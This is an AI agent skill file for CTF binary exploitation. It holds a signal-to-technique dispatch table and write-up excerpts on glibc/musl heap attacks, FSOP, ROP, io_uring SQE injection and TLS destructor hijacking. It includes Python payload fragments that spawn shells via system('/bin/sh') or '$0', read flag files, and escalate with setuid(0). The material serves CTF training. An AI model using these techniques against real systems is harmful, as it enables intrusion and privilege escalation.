---
name: ctf-pwn
description: Binary exploitation (pwn): stack/heap/format-string/ROP, glibc heap (House-of-*, leakless, FSOP/FSOPAgain), seccomp bypass, sandbox escape, Linux & Windows kernel exploitation (KASLR/SMEP/SMAP, token steal, cred swap, PreviousMode), BROP. Dispatch on binary/checksec signals.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Binary Exploitation (Pwn)

Quick reference for binary exploitation (pwn) CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Additional Resources

- [overflow-basics.md](overflow-basics.md) — stack/global overflow, canary bypass, ret2win
- [rop-and-shellcode.md](rop-and-shellcode.md) — ret2libc, ret2csu, syscall ROP, exotic gadgets
- [rop-advanced.md](rop-advanced.md) — SROP, RETF arch-switch, .fini_array, ret2vdso, stack pivot
- [format-string.md](format-string.md) — fmt leaks, GOT/hook overwrite, blind fmt, argv[0] tricks
- [advanced.md](advanced.md) — heap/UAF classics (House of Orange/Spirit/Lore), ret2dlresolve, JIT
- [advanced-2.md](advanced-2.md) — 2024-26: House of Apple 2 (glibc 2.34+), House of Einherjar, musl meta-pointer
- [advanced-exploits.md](advanced-exploits.md) — 2024 era: GC UAF, VM bugs, FSOP+seccomp, custom sandboxes
- [advanced-exploits-2.md](advanced-exploits-2.md) — 2024-early-2025: io_uring SQE inj, TLS dtor, MOP, corphone
- [advanced-exploits-3.md](advanced-exploits-3.md) — 2025-2026: vkfs FS, MIPS $gp, alloca, ObjC, ARM64 PAC, cmp timing
- [sandbox-escape.md](sandbox-escape.md) — custom VM, FUSE/CUSE, busybox/restricted shell
- [heap-leakless.md](heap-leakless.md) — glibc 2.32-2.39+ leakless (Rust/Water/Tangerine/Corrosion)
- [kernel.md](kernel.md) — Linux kernel fundamentals, QEMU debug, spray structures
- [kernel-techniques.md](kernel-techniques.md) — tty_struct kROP, SLUB internals, userfaultfd, DiceCTF 2026
- [kernel-bypass.md](kernel-bypass.md) — KASLR/FGKASLR, KPTI, SMEP/SMAP, exploit delivery
- [kernel-advanced.md](kernel-advanced.md) — EntryBleed, SLUBStick, DirtyCred, folly page-aliasing
- [brop.md](brop.md) — Blind ROP full chain without binary access
- [browser-jit.md](browser-jit.md) — V8/SpiderMonkey/JSC JIT type-confusion, sandbox bypass, OSR-exit
- [rust-pwn.md](rust-pwn.md) — Rust unwind drop, transmute, set_len uninit, async state confusion
---

## Pattern Recognition Index

Map **observable signals** (not challenge names) to the right technique. Scan this first when you're handed a binary and a remote.

| Signal observed in binary / source | Technique → file |
|---|---|
| `checksec`: NX but no canary, stack buffer + `read`/`gets` | Plain stack overflow → overflow-basics.md |
| Canary + forking server (pre-fork `accept` loop) | Byte-by-byte canary brute-force → overflow-basics.md |
| `int`/`ssize_t` length → `read(fd, buf, len)` with only `len > MAX` check | Signed→size_t confusion → advanced-exploits-2.md |
| `printf(user_ptr)` with no format string | Format-string leak + GOT overwrite → format-string.md |
| glibc 2.32+ tcache with Safe-Linking; no leaks possible | House of Rust / Water → heap-leakless.md |
| glibc 2.39+, no `free()` primitive exposed | House of Tangerine (malloc-only AAW) → heap-leakless.md |
| `mmap(MAP_FIXED)` exposed with controllable `addr`, `prot` | MOP — libc code-page zeroing → advanced-exploits-3.md |
| Fork/clone + tiny shared-mem handshake validating input char-by-char | strace byte-count side-channel → advanced-exploits-2.md |
| Kernel chall, unpriv userns, `splice()`/`vmsplice()` + large kmalloc free | Pipe-backed folio_put page-UAF → advanced-exploits-3.md |
| Container with custom bind-mounts on `/dev`, `/proc` under runc ≤ 1.1.x | runc 2025 symlink-race escape → advanced-exploits-3.md |
| Unicorn/QEMU sandbox with host-side helper reads | Host/guest hook divergence → advanced-exploits-3.md |
| Kernel io_uring SQE reachable via UAF / type confusion | io_uring worker abuse → kernel-advanced.md, advanced-exploits-2.md |
| KASLR + Linux ≥ 5.8 + prefetch available | EntryBleed → kernel-advanced.md |
| Windows driver IOCTL + NT kernel | PreviousMode / token stealing → kernel-advanced.md, advanced-exploits-2.md |
| No binary given, remote only, forking server with long timeout | Blind ROP (BROP) → brop.md |
| `seccomp` filter blocking execve, `open`/`read`/`write` allowed | ORW ROP → rop-and-shellcode.md, rop-advanced.md |
| MIPS ELF + overflow reachable + `$gp` loadable from writable region | `$gp`-pivot fake-GOT → advanced-exploits-3.md |
| Custom FS with `(mip,x,y)`-style path tuples + SHA256 hashing | Coord-indexed FS overflow → advanced-exploits-3.md |
| Format-string read + later FILE* UAF in same binary | FILE UAF + fstr bridge → advanced-exploits-3.md |
| `pthread` + user-controlled `alloca(n)` + `shutdown(fd, SHUT_WR)` | Cross-thread alloca smash + partial-close leak → advanced-exploits-3.md |
| `libobjc` linked + tcache-sized free followed by `objc_msgSend` | Isa-pointer UAF dispatch hijack → advanced-exploits-3.md |
| aarch64 kernel mod + `paciza`/`autiza` + IOCTL `sizeof` bound | ARM64 PAC-key exfil via bounds-mismatch AAR → advanced-exploits-3.md |
| seccomp kills `write`/`socket` + `/usr/bin/cmp` reachable + `/flag` readable | `cmp` timing oracle → advanced-exploits-3.md |
| C++ pwn with vtable dispatch + 0x110/0x480 chunk sizes | House of Spirit via C++ vtable → advanced-exploits.md |
| `SPLICE_F_GIFT` / `MSG_ZEROCOPY` / `TCP_ZEROCOPY_RECEIVE` in proxy | Zero-copy page aliasing TOCTOU → kernel-advanced.md |
| seccomp allows `io_uring_*` only, kernel ≥ 6.1 | `IORING_SETUP_NO_MMAP` escape → sandbox-escape.md |
| Sandboxed proc can recv from helper via AF_UNIX | SCM_RIGHTS fd smuggling → sandbox-escape.md |
| setuid binary scrubs secret after `read`, coredumps reachable | Coredump race → sandbox-escape.md |
| Non-standard eBPF prog on kprobe, flag gated by global state | eBPF FSM syscall-sequence → sandbox-escape.md |
| Traefik ≤ 2.11.13 front + Flask/Node admin routes | `X-Forwarded-*` reach → polyglot chain → advanced-exploits-3.md |
| `d8` / `js` / `jsc` binary + `*.patch` modifying JIT compiler sources | JIT type confusion → browser-jit.md |
| V8 build with `v8_enable_sandbox=true`; primitive only inside cage | ExternalPointerTable bypass → browser-jit.md |
| Turbofan typer patch touching `Type::Range` / `Type::OtherNumber` | Range-analysis type confusion → browser-jit.md |
| IonMonkey `RangeAnalysis.cpp` diff or JSC `DFGSpeculativeJIT.cpp` diff | OSR-exit / range bug → browser-jit.md |
| Rust panic caught + recovered with unsafe state between | Unwind-path `Drop` corruption → rust-pwn.md |
| `mem::transmute` / `slice::from_raw_parts_mut` on user-controlled len | Sliced-length OOB → rust-pwn.md |
| `Vec::reserve(n)` + `set_len(n)` without n writes | Uninitialised-drop vtable hijack → rust-pwn.md |
| `as u32` / `as usize` on subtraction result in release build | Truncation overflow → rust-pwn.md |
| `async fn` with `Pin<&mut Self>` across `.await` + raw-ptr aliasing | Future state-machine confusion → rust-pwn.md |
| `unprivileged_bpf_disabled=0` + kernel 5.13-6.5 + `bpf_prog_load` reachable | eBPF verifier pointer-arith bypass → kernel-advanced.md |
| `BPF_MAP_TYPE_RINGBUF` + kernel < 5.15 | Ringbuf stale-byte KASLR leak → kernel-advanced.md |

Recognize the **mechanic** first. The challenge title is never the signal.

---

For inline code/cheatsheet quick references (grep patterns, one-liners, common payloads), see [quickref.md](quickref.md). The `Pattern Recognition Index` above is the dispatch table — always consult it first; load `quickref.md` only if you need a concrete snippet after dispatch.



---

<!-- Source: advanced-2.md -->

# CTF Pwn - Advanced Heap (2024-2026)

Modern glibc / musl heap exploits from 2024-2026. For the canonical toolbox (UAF, classic House-of-* primitives, tcache stashing, ret2dlresolve, JIT), see [advanced.md](advanced.md).

## Table of Contents
- [House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)](#house-of-apple-2--fsop-for-glibc-234-0xfun-2026)
- [House of Einherjar — Off-by-One Null Byte (0xFun 2026)](#house-of-einherjar--off-by-one-null-byte-0xfun-2026)
- [musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)](#musl-libc-heap-exploitation--meta-pointer--atexit-unbreakable-2026)

---

## House of Apple 2 — FSOP for glibc 2.34+ (0xFun 2026)

**When to use:** Modern glibc (2.34+) removed `__free_hook`/`__malloc_hook`. House of Apple 2 uses FSOP via `_IO_wfile_jumps`.

**Full chain:** UAF → leak libc (unsorted bin fd/bk) → leak heap (safe-linking mangled NULL) → tcache poisoning to `_IO_list_all` → fake FILE → exit triggers shell.

**Fake FILE structure requirements:**
```python
fake_file = flat({
    0x00: b' sh\x00',           # _flags = " sh\x00" (fp starts with " sh")
    0x20: p64(0),                # _IO_write_base = 0
    0x28: p64(1),                # _IO_write_ptr = 1 (> _IO_write_base)
    0x88: p64(heap_addr),        # _lock (valid writable address)
    0xa0: p64(wide_data_addr),   # _wide_data pointer
    0xd8: p64(io_wfile_jumps),   # vtable = _IO_wfile_jumps
}, filler=b'\x00')

fake_wide_data = flat({
    0x18: p64(0),                # _IO_write_base = 0
    0x30: p64(0),                # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable), # _wide_vtable
})

fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),  # __doallocate offset
})
```

**Trigger chain:** `exit()` → `_IO_flush_all_lockp` → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)` → `system(fp)` where fp = `" sh\x00..."`.

**Safe-linking (glibc 2.32+):** tcache fd pointers are mangled: `fd = ptr ^ (chunk_addr >> 12)`. To poison tcache:
```python
# When writing to freed chunk, mangle the target address:
mangled_fd = target_addr ^ (current_chunk_addr >> 12)
```

---

## House of Einherjar — Off-by-One Null Byte (0xFun 2026)

**Vulnerability:** Off-by-one NUL at end of `malloc_usable_size` clears `PREV_INUSE` of next chunk.

**Exploit chain:**
1. Set `prev_size` of next chunk to create fake backward consolidation
2. Forge largebin-style chunk with `fd/bk` AND `fd_nextsize/bk_nextsize` all pointing to self (passes `unlink_chunk()`)
3. After consolidation, overlapping chunks enable tcache poisoning
4. Overwrite `stdout` or `_IO_list_all` for FSOP

**Key requirement:** Self-pointing unlink trick is essential. The fake chunk must pass `unlink_chunk()` which checks `FD->bk == P && BK->fd == P` and (for large chunks) `fd_nextsize->bk_nextsize == P && bk_nextsize->fd_nextsize == P`:

```python
# Fake chunk layout (at known heap address fake_addr):
#   chunk header:
#     prev_size:      don't care
#     size:           target_size | PREV_INUSE  (must match consolidation math)
#     fd:             fake_addr   (self-referencing)
#     bk:             fake_addr   (self-referencing)
#     fd_nextsize:    fake_addr   (self-referencing, needed for large chunks)
#     bk_nextsize:    fake_addr   (self-referencing)

fake_chunk = flat({
    0x00: p64(0),                # prev_size
    0x08: p64(target_size | 1),  # size with PREV_INUSE set
    0x10: p64(fake_addr),        # fd -> self
    0x18: p64(fake_addr),        # bk -> self
    0x20: p64(fake_addr),        # fd_nextsize -> self
    0x28: p64(fake_addr),        # bk_nextsize -> self
}, filler=b'\x00')

# Victim chunk's prev_size must equal distance from fake_chunk to victim
# Off-by-one NUL clears victim's PREV_INUSE bit
# free(victim) triggers backward consolidation: merges with fake_chunk
# Result: consolidated chunk overlaps other live allocations
```

**Setup sequence:**
1. Allocate chunks A (large, will hold fake chunk), B (filler), C (victim with off-by-one)
2. Write fake chunk into A with self-referencing pointers
3. Trigger off-by-one on C to clear B's PREV_INUSE and set B's prev_size
4. Free B → consolidates backward into A → overlapping chunk
5. Allocate over the overlap region to control other live chunks

---

## musl libc Heap Exploitation — Meta Pointer + atexit (UNbreakable 2026)

**Pattern (atypical-heap):** Binary linked against musl libc (not glibc). musl's allocator uses `meta` structures instead of chunk headers. OOB read leaks `meta->mem` pointer; arbitrary write redirects allocation to controlled address.

**musl allocator layout:**
- Each allocation belongs to a `group`, managed by a `meta` struct
- `meta->mem` points to the group's data region
- First `0x70`-class allocation places `meta0->mem` at a fixed offset from PIE base (e.g., `chall_base + 0x3f20`)

**Exploitation chain:**
1. **Leak meta pointer** — OOB read at offset `0x80` from a heap allocation reads the `meta` struct pointer
2. **Recover PIE base** — `meta0->mem` is at a fixed offset from the binary base
3. **Redirect allocation** — Overwrite `meta->mem` to point at a live group or target address. Next allocation from that group returns attacker-controlled memory
4. **atexit hijack** — Overwrite musl's `atexit` handler list with `system("cat flag")`. Normal program exit triggers code execution

```python
# Leak meta pointer via OOB read
meta_ptr = leak_at_offset(0x80)
pie_base = meta_ptr - 0x3f20  # fixed offset for first 0x70 allocation

# Rewrite meta->mem to redirect future allocations
write_at(meta_ptr + META_MEM_OFFSET, target_addr)

# Next alloc returns target_addr — use to overwrite atexit handlers
alloc_and_write(atexit_list_addr, system_addr, "cat flag")
```

**Key insight:** musl's allocator metadata (`meta` structs) is stored separately from heap data, but predictable offsets link them to the binary base. Unlike glibc, musl has no safe-linking or tcache — corrupting `meta->mem` gives direct allocation control. The `atexit` handler list is a simpler code execution target than glibc's `__free_hook` (which is removed in 2.34+).

**Detection:** Binary uses musl libc (check `ldd`, or `strings binary | grep musl`). Menu-style heap challenges with read/write primitives.

---




---

<!-- Source: advanced-exploits-2.md -->

# CTF Pwn - Advanced Exploit Techniques (Part 2)

## Table of Contents
- [Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)](#bytecode-validator-bypass-via-self-modification-srdnlenctf-2026)
- [io_uring UAF with SQE Injection (ApoorvCTF 2026)](#io_uring-uaf-with-sqe-injection-apoorvctf-2026)
- [Integer Truncation Bypass int32 to int16 (ApoorvCTF 2026)](#integer-truncation-bypass-int32-to-int16-apoorvctf-2026)
- [GC Null-Reference Cascading Corruption (DiceCTF 2026)](#gc-null-reference-cascading-corruption-dicectf-2026)
- [Leakless Libc via Multi-fgets stdout FILE Overwrite (Midnightflag 2026)](#leakless-libc-via-multi-fgets-stdout-file-overwrite-midnightflag-2026)
- [Signed/Unsigned Char Underflow to Heap Overflow + TLS Destructor Hijack (Midnightflag 2026)](#signedunsigned-char-underflow-to-heap-overflow--tls-destructor-hijack-midnightflag-2026)
  - [XOR Cipher Keystream Brute-Force Write Primitive](#xor-cipher-keystream-brute-force-write-primitive)
  - [Tcache Pointer Decryption for Heap Leak](#tcache-pointer-decryption-for-heap-leak)
  - [Forging Chunk Size for Unsorted Bin Promotion (Libc Leak)](#forging-chunk-size-for-unsorted-bin-promotion-libc-leak)
  - [FSOP Stdout Redirection for TLS Segment Leak](#fsop-stdout-redirection-for-tls-segment-leak)
  - [TLS Destructor Overwrite for RCE via `__call_tls_dtors`](#tls-destructor-overwrite-for-rce-via-__call_tls_dtors)
- [Custom Shadow Stack Bypass via Pointer Overflow (Midnight 2026)](#custom-shadow-stack-bypass-via-pointer-overflow-midnight-2026)
- [Signed Int Overflow to Negative OOB Heap Write + XSS-to-Binary Pwn Bridge (Midnight 2026)](#signed-int-overflow-to-negative-oob-heap-write--xss-to-binary-pwn-bridge-midnight-2026)
  - [Heap Primitive: Signed Int Overflow in Index Calculation](#heap-primitive-signed-int-overflow-in-index-calculation)
  - [Full Exploitation Chain](#full-exploitation-chain)
  - [XSS-to-Binary Pwn Bridge](#xss-to-binary-pwn-bridge)
- [Windows SEH Overwrite + pushad VirtualAlloc ROP (RainbowTwo HTB)](#windows-seh-overwrite--pushad-virtualalloc-rop-rainbowtwo-htb)
- [SeDebugPrivilege to SYSTEM (RainbowTwo HTB)](#sedebugprivilege-to-system-rainbowtwo-htb)
- [strace Byte-Count Side-Channel (404CTF 2024 "Nanocombattants")](#strace-byte-count-side-channel-404ctf-2024-nanocombattants)
- [Signed-to-size_t Type Confusion Triggering Stack Overflow](#signed-to-size_t-type-confusion-triggering-stack-overflow)

For 2025-2026 sections moved to [advanced-exploits-3.md](advanced-exploits-3.md): MOP libc zeroing, folio_put page UAF, Unicorn host/guest, runc 2025 escape, SekaiCTF 2025 vkfs / MIPS, HTB Business 2025, Midnightflag 2025.

---

## Bytecode Validator Bypass via Self-Modification (srdnlenCTF 2026)

**Pattern (Registered Stack):** Bytecode validator only checks initial bytes; runtime self-modification converts validated instructions into forbidden ones (e.g., `push fs` → `syscall`).

**Key technique:** `push fs` encodes as `0f a0`, and `syscall` as `0f 05`. The validator accepts `push fs`, but at runtime a preceding `push rbx` overwrites the `a0` byte with `05` on the stack, turning it into `syscall`.

**Exploit structure:**
1. Use `pop` instructions to adjust rsp to a predictable memory bucket (~1/16 probability due to ASLR)
2. Seed specific stack values for `pop sp` instruction (pivots to controlled location)
3. Place `syscall` gadget disguised as `push fs` with self-modifying byte mutation
4. Use `read(0, stage2_buf, size)` syscall to load stage 2
5. Stage 2 contains interactive shell code

```python
code = []
code += [0x59] * 30              # pop rcx x30 → rsp += 0xf0
code += [0x66, 0x5c]             # pop sp → pivot to seeded value
code += [0x50] * 17              # push rax x17 (adjust stack)
code += [0x66, 0x50]             # push ax
code += [0x66, 0x54, 0x66, 0x5b] # push sp; pop bx (rbx = count for read)
code += [0x50] * 66              # push rax x66
code += [0x66, 0x59]             # pop cx
code += [0x53]                   # push rbx → overwrites next byte!
# Following bytes: 0x54 0x5e 0x53 0x5a 0x54 0x0f 0xa0
# After push rbx mutates 0xa0 → 0x05: becomes syscall
code += [0x54, 0x5e, 0x53, 0x5a, 0x54, 0x0f, 0xa0]
```

**Key insight:** Bytecode validators that only check the instruction stream statically are vulnerable to self-modification at runtime. Look for instruction pairs where one byte difference changes the instruction's semantics (e.g., `0f a0` → `0f 05`). Use preceding instructions to write the mutation byte onto the stack/code region.

---

## io_uring UAF with SQE Injection (ApoorvCTF 2026)

**Pattern (Abyss):** Multi-threaded binary with custom slab allocator and io_uring worker thread. A FLUSH operation frees objects but preserves dangling pointers, creating UAF. Type confusion between freed/reallocated objects enables injection of io_uring SQE (Submission Queue Entry) structures.

**Exploitation chain:**
1. Exhaust both slab allocators (fill all slots)
2. Leak PIE base from STATUS response
3. FLUSH frees objects (UAF — pointers remain valid)
4. Allocate different type into freed slots (type confusion via exhausted secondary slab falling back to primary)
5. Write crafted io_uring SQE into reused memory
6. Worker thread submits SQE as-is → `IORING_OP_OPENAT` opens flag file

**io_uring SQE structure for file read:**
```python
import struct

def craft_sqe(pie_base, flag_path_offset=0x6010):
    sqe = bytearray(64)
    struct.pack_into('B', sqe, 0, 0x12)       # opcode = IORING_OP_OPENAT
    struct.pack_into('i', sqe, 4, -100)        # fd = AT_FDCWD
    struct.pack_into('Q', sqe, 16, pie_base + flag_path_offset)  # addr = "/flag.txt"
    return bytes(sqe)
```

**Key insight:** io_uring's kernel-side processing trusts SQE contents from userland shared memory. If an attacker controls the SQE buffer via UAF/type confusion, arbitrary kernel operations (file open, read, write) execute without syscall filtering. XOR-encoded slab freelists add complexity but don't prevent logical UAF when FLUSH clears objects without NULLing all references.

**Detection:** Binary uses `io_uring_setup`/`io_uring_enter` syscalls, custom allocator with FLUSH/cleanup operations, multiple threads sharing memory.

---

## Integer Truncation Bypass int32 to int16 (ApoorvCTF 2026)

**Pattern (Archive):** Input validated as int32 (>= 0), then cast to int16_t for bounds check (<= 3). Values 65534-65535 pass the int32 check but become -2/-1 as int16_t, enabling OOB array access.

```python
# Value 65534: int32=65534 (passes >= 0), int16=-2 (passes <= 3)
# ring_array[-2] reads 16 bytes before array → leaks GOT/PIE pointers
payload = str(65534).encode()  # Sends as positive int, server casts to int16
```

**Dynamic fd capture via `xchg rdi, rax`:**

In Docker/socat environments, `open()` may return fd 4+ instead of 3 (extra inherited fds). Hardcoding fd=3 in ORW ROP chains fails.

```python
# Standard ORW fails in Docker:
# open("/flag.txt") → fd=5 (not 3!)
# read(3, buf, size) → reads wrong fd

# Fix: xchg rdi, rax captures open()'s return value dynamically
rop = ROP(libc)
rop.raw(pop_rdi)
rop.raw(flag_str_addr)
rop.raw(pop_rsi)
rop.raw(0)  # O_RDONLY
rop.raw(libc.sym.open)
rop.raw(libc_base + 0x181fe1)  # xchg rdi, rax; cld; ret
# rdi now holds actual fd from open()
rop.raw(pop_rsi)
rop.raw(buf_addr)
rop.raw(pop_rdx_xor_eax)  # pop rdx; xor eax, eax; ret (dual-purpose!)
rop.raw(0x100)  # rdx = size, eax = 0 (SYS_read)
rop.raw(libc.sym.read)  # read(actual_fd, buf, 0x100)
```

**Key insight:** `xchg rdi, rax; cld; ret` is the critical gadget for containerized ORW — it passes `open()`'s actual return value to `read()` without hardcoding the fd number. The `pop rdx; xor eax, eax; ret` gadget serves double duty: sets rdx for read size AND clears eax to 0 (SYS_read syscall number).

---

## GC Null-Reference Cascading Corruption (DiceCTF 2026)

**Pattern (Garden):** Custom stack-based VM with mark-compact GC. GC's `mark_reachable()` follows null references (ref=0) to address 0 of the managed heap (zeroed reserved area), creating a fake 4-byte object. During compaction, `memmove` copies this fake object first, corrupting adjacent real object headers.

**Exploit chain:**
1. **Cascading memmove** — Set up sacrificial array SAC with `entries[0]=0xFFFF`, large array BIG (196 entries) with `entries[195]=0x00040005`, off-heap object OH
   - Null-ref GC corrupts SAC's header to `{0,0}` (length=0)
   - SAC's entry `0xFFFF` cascades into BIG's header → BIG.length = 0xFFFF (OOB!)
   - BIG's entry `0x00040005` cascades into OH's header → OH stays valid

2. **OOB expansion** — Use BIG's OOB write to set OH.obj_size = 0x10000, giving 256KB OOB access on glibc heap

3. **Libc leak** — Create 70+ extra objects so GC's `ctx.objs` allocation exceeds 0x410 bytes → freed to unsorted bin → `main_arena` pointers readable via OH

4. **House of Apple 2 FSOP** — Build fake FILE in OH's data buffer:
```python
# Fake FILE structure
fake_file = flat({
    0x00: b'$0\x00\x00',             # _flags — system("$0") spawns shell
    0x20: p64(0),                      # _IO_write_base = 0
    0x28: p64(1),                      # _IO_write_ptr = 1 (> write_base)
    0x88: p64(heap_lock_addr),         # _lock (valid writable addr)
    0xa0: p64(wide_data_addr),         # _wide_data
    0xc0: p64(1),                      # _mode = 1 (triggers wide path)
    0xd8: p64(io_wfile_jumps),         # vtable = _IO_wfile_jumps
})
# Fake _IO_wide_data
fake_wide = flat({
    0x18: p64(0),                      # _IO_write_base = 0
    0x30: p64(0),                      # _IO_buf_base = 0
    0xe0: p64(fake_wide_vtable_addr),  # _wide_vtable
})
# Fake wide vtable with __doallocate = system
fake_wide_vtable = flat({
    0x68: p64(libc.sym.system),
})
# Overwrite _IO_list_all to point to fake FILE
```

5. **Trigger** — Program exit → `_IO_flush_all` → fake FILE → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `system("$0")` → shell

**`system("$0")` trick:** `$0` expands to the shell name when run via `system()`. Using `"$0\x00\x00"` as `_flags` means `system(fp)` calls `system("$0")` which spawns a shell.

**Key insight:** Mark-compact GC that follows null references creates controllable corruption. The cascade effect — where one corrupted header causes memmove to misalign subsequent objects — amplifies a small initial corruption into full OOB access. Combined with FSOP, this achieves code execution from a VM-level bug.

**STORE array pattern for VM stack management:** When VM only has DUP/SWAP/DROP/DUP_X1, allocate an array object to hold references (via SET_ELEM_OBJ/GET_ELEM_OBJ), enabling random access to values that would otherwise require complex stack juggling.

---

## Leakless Libc via Multi-fgets stdout FILE Overwrite (Midnightflag 2026)

**Pattern (Eyeless):** No direct libc leak available (no format string, no UAF, no unsorted bin). Construct a fake `stdout` FILE structure on BSS via ROP, then call `fflush(stdout)` to leak a GOT entry containing a libc address.

**The null byte problem:** `fgets` appends `\x00` after reading. Libc pointers are 6 bytes + 2 null MSBs (`0x00007f...`). Writing an 8-byte pointer via `fgets` corrupts the byte after it with `\x00`. Directly writing adjacent FILE struct fields is impossible without corruption.

**Multi-fgets solution:** Chain multiple `fgets(addr, 7, stdin)` calls, each writing 7 bytes. The null byte from each `fgets` lands on the next field's null MSB (harmless for libc pointers):

```python
# Build ROP chain that calls fgets multiple times to construct stdout on BSS
# Each call writes 7 bytes; null byte falls on canonical address's 0x00 MSB
FAKE_STDOUT = BSS + 0x800

# Write _flags field
rop += fgets_call(FAKE_STDOUT, 7)      # write 0xfbad2087 + padding
# Write _IO_write_base = GOT address (the value to leak)
rop += fgets_call(FAKE_STDOUT + 0x20, 7)  # write &fflush@GOT
# Write _IO_write_end = GOT address + 8 (controls how many bytes leak)
rop += fgets_call(FAKE_STDOUT + 0x28, 7)  # write &fflush@GOT + 8
# ... (zero-fill remaining fields via earlier memset or BSS zeroes)

# Overwrite stdout pointer and flush
rop += flat(POP_RDI, FAKE_STDOUT)
rop += flat(elf.plt['fflush'])  # fflush(fake_stdout) → writes GOT content
```

**Receiving the leak:**
```python
# fflush writes 8 bytes from _IO_write_base to _IO_write_end
leak = u64(p.recv(8))
libc_base = leak - libc.sym.fflush
```

**Key insight:** `fgets` always appends `\x00`, but libc addresses already end with `\x00\x00` in their two MSBs. Writing in 7-byte chunks means the appended null overwrites a byte that is already null. This enables constructing complex structures (FILE, vtables) in BSS without a prior libc leak.

**When to use:** Binary has `fgets` or similar input function in PLT, a writable BSS/data region, but no existing leak primitive. Requires ROP control (stack pivot) to chain the multiple `fgets` calls.

---

## Signed/Unsigned Char Underflow to Heap Overflow + TLS Destructor Hijack (Midnightflag 2026)

**Pattern (heapn⊕te-ic):** Message structure stores size as `signed char` but encryption/display casts to `unsigned char`. Passing `size = -112` stores as `char(-112)`, but `(unsigned char)(-112) = 144`. With a 127-byte buffer, this gives a 17-byte heap overflow.

**Key insight:** The signed/unsigned char mismatch is a single-byte integer type — unlike int32→int16 truncation, this exploits the implicit promotion from `char` to `unsigned char` in C, common when size fields use `char` instead of `size_t`.

### XOR Cipher Keystream Brute-Force Write Primitive

The challenge uses a deterministic XOR cipher with djb2 hash chain as keystream:

```python
def hash_string(s):
    h = 5381
    for c in s:
        h = (((h << 5) + h) + c) & 0xFFFFFFFFFFFFFFFF
    return h

def get_keystream_byte(seed, x):
    h = hash_string(str(seed).encode())
    for _ in range(x // 8):
        h = hash_string(str(h).encode())
    return p64(h)[x % 8]

def brute_seed(x, target_byte):
    for seed in range(0xFFFFFFFF):
        if get_keystream_byte(seed, x) == target_byte:
            return seed
```

**Key insight:** Deterministic keystream from a brute-forceable seed space enables targeted byte writes via XOR. Each byte position requires finding a seed that produces the desired keystream byte, then XORing with plaintext to write exactly that byte.

**Byte-by-byte write primitive:**
```python
def write_byte(pos, target_byte, idx, leak=False):
    add(underflow(pos), b"A", brute_seed(pos, target_byte))
    if leak:
        data = view(idx)
    delete(idx)
    add(underflow(pos+1), b"A", brute_seed(pos, target_byte))
    delete(idx)
    return data

def overflow_write(offset, payload, idx):
    for i, byte in enumerate(payload):
        write_byte(offset + i, byte, idx)
```

### Tcache Pointer Decryption for Heap Leak

Allocate two chunks, free in LIFO order. The mangled tcache `fd` pointer (glibc 2.32+ safe-linking) stored in the freed chunk can be decoded:

```python
# fd is mangled: fd = ptr ^ (chunk_addr >> 12)
# When first tcache entry points to NULL (second free):
# fd = 0 ^ (chunk_addr >> 12) = chunk_addr >> 12
# Shift left to recover: heap_addr = fd_pointer << 12
heap_leak = u64(leaked_fd) << 12
```

**Key insight:** The first entry in a tcache bin has `fd = NULL ^ (addr >> 12)`, so `fd << 12` directly yields the heap base region. No brute-force needed.

### Forging Chunk Size for Unsorted Bin Promotion (Libc Leak)

To get a libc leak from tcache-sized chunks, forge the next chunk's size header to ≥0x420 (minimum for unsorted bin):

```python
# Overwrite adjacent chunk's size field to 0x431
overflow_write(size_offset, p64(0x431), chunk_idx)
# Ensure fake next_chunk passes: next_chunk.size & PREV_INUSE set
# next_chunk + 0x431 must point to a region with valid size field
# Free the forged chunk → pushed to unsorted bin
# fd/bk now point to main_arena+96
libc_base = u64(leaked_fd) - 0x203b20  # offset to main_arena+96
```

**Key insight:** Any chunk can be promoted to unsorted bin by forging its size ≥0x420. The consistency check requires that `chunk_at_offset(p, size)->size` has `PREV_INUSE` set and is reasonable. Pre-place valid metadata at that boundary.

### FSOP Stdout Redirection for TLS Segment Leak

Tcache poison toward `_IO_2_1_stdout_ - 0x20` to craft a fake FILE structure that leaks the TLS segment address:

```python
# Poison tcache to allocate at _IO_2_1_stdout_ - 0x20
# Craft fake FILE with _IO_write_base pointing to TLS area
# When stdout flushes, it writes from _IO_write_base to _IO_write_ptr
# Scan output for address ending in 0x...740 (TLS alignment pattern)
# TLS mangle cookie is at tls_addr + 0x30
```

**Key insight:** Redirecting `_IO_write_base` of stdout leaks arbitrary memory on the next write. TLS addresses have recognizable alignment patterns — scan the leaked data for them.

### TLS Destructor Overwrite for RCE via `__call_tls_dtors`

The TLS destructor list (`__tls_dtor_list`) contains entries with function pointers mangled using the pointer guard (stored in TLS). Overwriting this list with crafted entries achieves RCE:

```python
def rol(val, bits, width=64):
    return ((val << bits) | (val >> (width - bits))) & ((1 << width) - 1)

# Mangle function pointers with leaked pointer guard
pointer_guard = tls_leak  # from stdout FSOP leak
encoded_setuid = rol(libc.sym.setuid ^ pointer_guard, 0x11)
encoded_system = rol(libc.sym.system ^ pointer_guard, 0x11)

# Craft TLS destructor list node
# struct dtor_list { dtor_func func; void *obj; struct dtor_list *next; }
node1 = p64(0) * 2           # padding
node1 += p64(0x111)          # fake chunk size
node1 += p64(encoded_setuid) # func = setuid(0)
node1 += p64(0)              # obj = 0 (root)
node1 += p64(heap_addr + node2_offset) * 2  # next → node2

node2 = p64(encoded_system)  # func = system("/bin/sh")
node2 += p64(binsh_addr)     # obj = "/bin/sh"
node2 += p64(0)              # next = NULL (end of list)
```

**Full chain:** integer underflow → heap overflow → tcache leak → unsorted bin libc leak → FSOP stdout TLS leak → pointer guard recovery → `__call_tls_dtors` hijack → `setuid(0)` + `system("/bin/sh")`.

